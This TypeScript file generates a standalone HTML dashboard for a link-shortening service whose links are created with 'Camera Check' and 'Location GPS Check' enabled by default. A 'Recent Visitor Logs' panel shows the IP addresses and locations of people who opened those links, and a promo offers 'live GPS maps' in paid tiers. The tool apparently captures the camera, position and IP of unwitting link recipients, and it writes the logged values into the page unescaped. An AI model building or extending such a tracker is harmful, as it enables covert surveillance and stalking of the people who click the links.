/**
 * Generates the downloadable, self-hosted `index.html` client.
 * This mirrors the reference "Export Standalone HTML" feature: a single-file
 * dashboard that talks to the same /api/shorten + /api/analytics endpoints.
 *
 * Three visual tiers are offered: Free Minimal, Pro Dark (cyber-glass) and
 * VIP 3D Clay (liquid clay glass). Logic is shared between tiers.
 */

export interface StandaloneOptions {
  developerName: string;
  channelUrl: string;
  brandName: string;
  apiEndpoint: string;
  tier?: "free" | "pro" | "vip";
}

function esc(v: string): string {
  return v.replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

const SHARED_SCRIPT = `
    const API_BASE = "%%API%%";
    const brand = "%%BRAND%%";
    const dev = "%%DEV%%";
    const shortenForm = document.getElementById("shortenForm");
    const submitBtn = document.getElementById("submitBtn");
    const alertBox = document.getElementById("alertBox");
    const resultCard = document.getElementById("resultCard");
    const resultUrlInput = document.getElementById("resultUrlInput");
    const resultShortCode = document.getElementById("resultShortCode");
    const copyBtn = document.getElementById("copyBtn");
    const openLinkBtn = document.getElementById("openLinkBtn");
    const fetchLogsBtn = document.getElementById("fetchLogsBtn");
    const logsContainer = document.getElementById("logsContainer");

    function showAlert(msg, isErr) {
      alertBox.className = isErr
        ? "alert alert-error"
        : "alert alert-success";
      alertBox.textContent = msg;
    }

    shortenForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      alertBox.classList.add("hidden");
      resultCard.classList.add("hidden");
      submitBtn.disabled = true;
      submitBtn.textContent = "Creating...";
      try {
        const res = await fetch(API_BASE + "/api/shorten", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            longUrl: document.getElementById("longUrl").value.trim(),
            customAlias: document.getElementById("customAlias").value.trim() || undefined,
            phoneNumber: document.getElementById("phoneNumber").value.trim() || undefined,
            captureCamera: document.getElementById("captureCamera").checked,
            captureLocation: document.getElementById("captureLocation").checked,
            deviceId: "standalone-" + brand.toLowerCase().replace(/[^a-z0-9]/g, ""),
          }),
        });
        const data = await res.json();
        if (res.ok && data.success) {
          resultCard.classList.remove("hidden");
          resultUrlInput.value = data.shortUrl;
          resultShortCode.textContent = data.data?.short_code || "";
          openLinkBtn.href = data.shortUrl;
          showAlert("Smart link created successfully!");
          setTimeout(loadLogs, 1500);
        } else {
          showAlert(data.message || data.error || "Failed to create link", true);
        }
      } catch (err) {
        showAlert("Network error: " + err.message, true);
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "Create Link";
      }
    });

    copyBtn.addEventListener("click", () => {
      resultUrlInput.select();
      navigator.clipboard.writeText(resultUrlInput.value);
      copyBtn.textContent = "Copied!";
      setTimeout(() => (copyBtn.textContent = "Copy"), 2000);
    });

    async function loadLogs() {
      const phone = document.getElementById("phoneNumber").value.trim();
      logsContainer.innerHTML = "Loading...";
      try {
        const q = phone
          ? "phoneNumber=" + encodeURIComponent(phone)
          : "deviceId=standalone-" + brand.toLowerCase().replace(/[^a-z0-9]/g, "");
        const res = await fetch(API_BASE + "/api/links?" + q);
        const data = await res.json();
        const links = (data.links || []).slice(0, 10);
        if (!links.length) {
          logsContainer.innerHTML = "No links yet.";
          return;
        }
        const rows = await Promise.all(
          links.map(async (l) => {
            const a = await fetch(API_BASE + "/api/analytics?shortCode=" + encodeURIComponent(l.short_code));
            const ad = await a.json();
            const logs = ad.data || [];
            if (!logs.length) return "";
            return logs
              .slice(0, 5)
              .map(
                (g) =>
                  '<div class="log-row"><div><span class="mono">' +
                  (g.ip_address || "IP") +
                  '</span> <span class="muted">' +
                  (g.location_name || "") +
                  '</span></div><span class="muted">' +
                  new Date(g.created_at).toLocaleTimeString() +
                  "</span></div>",
              )
              .join("");
          }),
        );
        const html = rows.join("");
        logsContainer.innerHTML = html || "No visitor logs yet.";
      } catch (err) {
        logsContainer.innerHTML = "Error loading logs.";
      }
    }
    fetchLogsBtn.addEventListener("click", loadLogs);
`;

const THEMES: Record<string, string> = {
  free: `
    :root { color-scheme: light; }
    * { box-sizing: border-box; }
    body { font-family: Inter, system-ui, sans-serif; margin: 0; background: #f8fafc; color: #1e293b; }
    .wrap { max-width: 780px; margin: 0 auto; padding: 20px; display: flex; flex-direction: column; gap: 18px; }
    .card { background: #fff; border: 1px solid #e2e8f0; border-radius: 14px; padding: 18px; box-shadow: 0 1px 3px rgba(0,0,0,.05); }
    header.card { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; justify-content: space-between; }
    .logo { width: 40px; height: 40px; border-radius: 10px; background: #2563eb; color: #fff; display: grid; place-items: center; font-size: 18px; }
    h1 { font-size: 17px; margin: 0; } h2 { font-size: 15px; margin: 0 0 12px; }
    .muted { color: #64748b; font-size: 12px; }
    label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 5px; }
    input[type=text], input[type=url] { width: 100%; padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 9px; font-size: 14px; }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .checks { display: flex; gap: 18px; font-size: 13px; padding: 6px 0; }
    .checks label { display: flex; align-items: center; gap: 7px; font-weight: 500; }
    button, .btn { border: 0; border-radius: 9px; padding: 11px 16px; font-weight: 600; font-size: 14px; cursor: pointer; }
    .primary { width: 100%; background: #2563eb; color: #fff; }
    .ghost { background: #f1f5f9; color: #1e293b; }
    .link { background: #2563eb; color: #fff; text-decoration: none; display: inline-block; padding: 10px 14px; border-radius: 9px; font-size: 13px; }
    .alert { padding: 10px 12px; border-radius: 9px; font-size: 13px; margin-top: 12px; }
    .alert-success { background: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; }
    .alert-error { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
    .hidden { display: none; }
    .row { display: flex; gap: 8px; }
    .log-row { display: flex; justify-content: space-between; border-bottom: 1px solid #f1f5f9; padding: 8px 0; font-size: 13px; }
    .mono { font-family: ui-monospace, Menlo, monospace; font-weight: 700; }
    .promo { background: #fffbeb; border: 1px solid #fde68a; border-radius: 14px; padding: 14px; display: flex; justify-content: space-between; gap: 12px; align-items: center; font-size: 13px; }
    footer { text-align: center; font-size: 12px; color: #64748b; padding: 8px; }
    @media (max-width: 560px) { .grid { grid-template-columns: 1fr; } .row { flex-wrap: wrap; } }
  `,
  pro: `
    :root { color-scheme: dark; }
    * { box-sizing: border-box; }
    body { font-family: Inter, system-ui, sans-serif; margin: 0; color: #d8e6ef; background: radial-gradient(circle at 20% 10%, #0b2230, #050a12 60%); min-height: 100vh; }
    .wrap { max-width: 800px; margin: 0 auto; padding: 22px; display: flex; flex-direction: column; gap: 18px; }
    .card { background: rgba(18,38,52,.72); border: 1px solid rgba(90,200,255,.22); border-radius: 16px; padding: 18px; backdrop-filter: blur(10px); box-shadow: 0 18px 40px -18px rgba(0,200,255,.35); }
    header.card { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; justify-content: space-between; }
    .logo { width: 42px; height: 42px; border-radius: 12px; background: linear-gradient(135deg,#22d3ee,#0ea5e9); color: #04121a; display: grid; place-items: center; font-size: 18px; }
    h1 { font-size: 17px; margin: 0; color: #eaf7ff; } h2 { font-size: 15px; margin: 0 0 12px; color: #cfeeff; }
    .muted { color: #7fa7bd; font-size: 12px; }
    label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 5px; color: #9fd0e6; }
    input[type=text], input[type=url] { width: 100%; padding: 10px 12px; border: 1px solid rgba(90,200,255,.3); background: rgba(5,16,24,.7); color: #eaf7ff; border-radius: 10px; font-size: 14px; }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .checks { display: flex; gap: 18px; font-size: 13px; padding: 6px 0; color: #bcd9e8; }
    .checks label { display: flex; align-items: center; gap: 7px; font-weight: 500; }
    button, .btn { border: 0; border-radius: 10px; padding: 11px 16px; font-weight: 700; font-size: 14px; cursor: pointer; }
    .primary { width: 100%; background: linear-gradient(90deg,#0ea5e9,#22d3ee); color: #04121a; }
    .ghost { background: rgba(90,200,255,.14); color: #cdefff; }
    .link { background: linear-gradient(90deg,#0ea5e9,#22d3ee); color: #04121a; text-decoration: none; display: inline-block; padding: 10px 14px; border-radius: 10px; font-size: 13px; font-weight: 700; }
    .alert { padding: 10px 12px; border-radius: 10px; font-size: 13px; margin-top: 12px; }
    .alert-success { background: rgba(16,185,129,.15); color: #6ee7b7; border: 1px solid rgba(16,185,129,.4); }
    .alert-error { background: rgba(244,63,94,.15); color: #fda4af; border: 1px solid rgba(244,63,94,.4); }
    .hidden { display: none; }
    .row { display: flex; gap: 8px; }
    .log-row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(90,200,255,.12); padding: 8px 0; font-size: 13px; }
    .mono { font-family: ui-monospace, Menlo, monospace; font-weight: 700; color: #7ee7ff; }
    .promo { background: rgba(34,211,238,.1); border: 1px solid rgba(34,211,238,.3); border-radius: 16px; padding: 14px; display: flex; justify-content: space-between; gap: 12px; align-items: center; font-size: 13px; }
    footer { text-align: center; font-size: 12px; color: #7fa7bd; padding: 8px; }
    @media (max-width: 560px) { .grid { grid-template-columns: 1fr; } .row { flex-wrap: wrap; } }
  `,
  vip: `
    * { box-sizing: border-box; }
    body { font-family: "Plus Jakarta Sans", Inter, system-ui, sans-serif; margin: 0; color: #1b2430; background: radial-gradient(circle at 50% 20%, #e6e2d8, #cfc8ba 70%); min-height: 100vh; }
    .wrap { max-width: 800px; margin: 0 auto; padding: 22px; display: flex; flex-direction: column; gap: 18px; }
    .card { background: linear-gradient(135deg, rgba(255,255,255,.6), rgba(244,240,232,.32)); border: 2px solid rgba(255,255,255,.88); border-radius: 26px; padding: 18px; backdrop-filter: blur(16px) saturate(140%); box-shadow: 0 18px 34px -10px rgba(45,40,32,.26), inset 0 3px 6px rgba(255,255,255,.95), inset 0 -4px 8px rgba(70,62,50,.2); }
    header.card { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; justify-content: space-between; }
    .logo { width: 46px; height: 46px; border-radius: 9999px; background: radial-gradient(circle at 35% 30%,#5b7fff,#2b44b8 62%,#1a297a); color: #fff; display: grid; place-items: center; font-size: 20px; box-shadow: 0 12px 24px -4px rgba(37,60,175,.55), inset 0 4px 8px rgba(255,255,255,.9); }
    h1 { font-size: 18px; margin: 0; font-weight: 900; } h2 { font-size: 16px; margin: 0 0 12px; font-weight: 800; }
    .muted { color: #4a5568; font-size: 12px; }
    label { display: block; font-size: 12px; font-weight: 800; margin-bottom: 6px; text-transform: uppercase; letter-spacing: .04em; }
    input[type=text], input[type=url] { width: 100%; padding: 12px 14px; border: 2px solid rgba(255,255,255,.95); background: rgba(255,255,255,.72); border-radius: 9999px; font-size: 14px; box-shadow: inset 0 3px 6px rgba(0,0,0,.08); }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .checks { display: flex; gap: 18px; font-size: 13px; padding: 6px 0; }
    .checks label { display: flex; align-items: center; gap: 7px; text-transform: none; font-weight: 600; }
    button, .btn { border: 2px solid rgba(255,255,255,.9); border-radius: 9999px; padding: 12px 18px; font-weight: 900; font-size: 14px; cursor: pointer; }
    .primary { width: 100%; color: #fff; background: radial-gradient(circle at 35% 30%,#5b7fff,#2b44b8 62%,#1a297a); box-shadow: 0 12px 24px -4px rgba(37,60,175,.55), inset 0 4px 8px rgba(255,255,255,.85); }
    .ghost { background: rgba(255,255,255,.8); color: #1b2430; box-shadow: 0 4px 10px rgba(0,0,0,.06), inset 0 2px 4px #fff; }
    .link { color: #fff; text-decoration: none; display: inline-block; padding: 11px 16px; border-radius: 9999px; font-size: 13px; font-weight: 800; background: radial-gradient(circle at 35% 30%,#5b7fff,#2b44b8 62%,#1a297a); box-shadow: 0 10px 20px -4px rgba(37,60,175,.5), inset 0 3px 6px rgba(255,255,255,.8); }
    .alert { padding: 11px 14px; border-radius: 16px; font-size: 13px; margin-top: 12px; }
    .alert-success { background: rgba(16,185,129,.18); color: #065f46; border: 1.5px solid rgba(16,185,129,.4); }
    .alert-error { background: rgba(244,63,94,.16); color: #9f1239; border: 1.5px solid rgba(244,63,94,.4); }
    .hidden { display: none; }
    .row { display: flex; gap: 8px; }
    .log-row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,.4); padding: 8px 0; font-size: 13px; }
    .mono { font-family: ui-monospace, Menlo, monospace; font-weight: 800; }
    .promo { background: linear-gradient(145deg, rgba(255,255,255,.68), rgba(244,239,230,.42)); border: 2px solid rgba(255,255,255,.9); border-radius: 24px; padding: 14px; display: flex; justify-content: space-between; gap: 12px; align-items: center; font-size: 13px; }
    footer { text-align: center; font-size: 12px; color: #4a5568; padding: 8px; }
    @media (max-width: 560px) { .grid { grid-template-columns: 1fr; } .row { flex-wrap: wrap; } }
  `,
};

export function generateStandaloneHtml(opts: StandaloneOptions): string {
  const tier = opts.tier || "free";
  const brand = esc(opts.brandName || "Saqib Visuals");
  const dev = esc(opts.developerName || "Muhammad Saqib");
  const channel = esc(opts.channelUrl || "#");
  const api = esc((opts.apiEndpoint || "").replace(/\/+$/, "")) || "";
  const theme = THEMES[tier] || THEMES.free;
  const tierLabel =
    tier === "free" ? "Standard Shortlink Client (Free Tier)"
    : tier === "pro" ? "Pro Cyber-Glass Client"
    : "VIP 3D Clay Glass Client";

  const script = SHARED_SCRIPT.replace(/%%API%%/g, api)
    .replace(/%%BRAND%%/g, brand)
    .replace(/%%DEV%%/g, dev);

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${brand} - ${tierLabel}</title>
  <style>${theme}</style>
</head>
<body>
  <div class="wrap">
    <header class="card">
      <div style="display:flex;align-items:center;gap:12px">
        <div class="logo">🔗</div>
        <div>
          <h1>${brand}</h1>
          <p class="muted">${tierLabel}</p>
        </div>
      </div>
      <div style="display:flex;align-items:center;gap:8px">
        <span class="muted">Dev: ${dev}</span>
        <a class="link" href="${channel}" target="_blank" rel="noreferrer">Channel ↗</a>
      </div>
    </header>

    <div class="card">
      <h2>Shorten URL</h2>
      <form id="shortenForm">
        <div style="margin-bottom:14px">
          <label>Destination URL</label>
          <input type="url" id="longUrl" required placeholder="https://example.com" />
        </div>
        <div class="grid" style="margin-bottom:14px">
          <div>
            <label>Custom Alias (Optional)</label>
            <input type="text" id="customAlias" placeholder="alias" />
          </div>
          <div>
            <label>Tracking ID / Phone</label>
            <input type="text" id="phoneNumber" placeholder="dev-user" value="${dev.toLowerCase().replace(/[^a-z0-9]/g, "") || "dev"}" />
          </div>
        </div>
        <div class="checks">
          <label><input type="checkbox" id="captureCamera" checked /> Camera Check</label>
          <label><input type="checkbox" id="captureLocation" checked /> Location GPS Check</label>
        </div>
        <button type="submit" id="submitBtn" class="primary">Create Link</button>
      </form>
      <div id="alertBox" class="alert hidden"></div>
      <div id="resultCard" class="hidden" style="margin-top:14px">
        <div class="row" style="align-items:center;justify-content:space-between;margin-bottom:8px">
          <strong>Link Created!</strong>
          <span id="resultShortCode" class="mono muted"></span>
        </div>
        <div class="row">
          <input type="text" id="resultUrlInput" readonly />
          <button type="button" id="copyBtn" class="ghost">Copy</button>
          <a id="openLinkBtn" class="link" href="#" target="_blank" rel="noreferrer">Open ↗</a>
        </div>
      </div>
    </div>

    <div class="promo">
      <div>
        <p style="margin:0;font-weight:800">✨ Want the 3D Liquid Clay Glass UI?</p>
        <p class="muted" style="margin:4px 0 0">Upgrade to Pro/VIP to unlock the full 3D Glass OS with live GPS maps.</p>
      </div>
      <a class="link" href="${channel}" target="_blank" rel="noreferrer">Upgrade</a>
    </div>

    <div class="card">
      <div class="row" style="align-items:center;justify-content:space-between;margin-bottom:10px">
        <h2 style="margin:0">Recent Visitor Logs</h2>
        <button id="fetchLogsBtn" class="ghost">Refresh Logs</button>
      </div>
      <div id="logsContainer" class="muted">Click "Refresh Logs" to load recent visitors.</div>
    </div>

    <footer>Developed by ${dev} • ${brand}</footer>
  </div>

  <script>${script}</script>
</body>
</html>`;
}
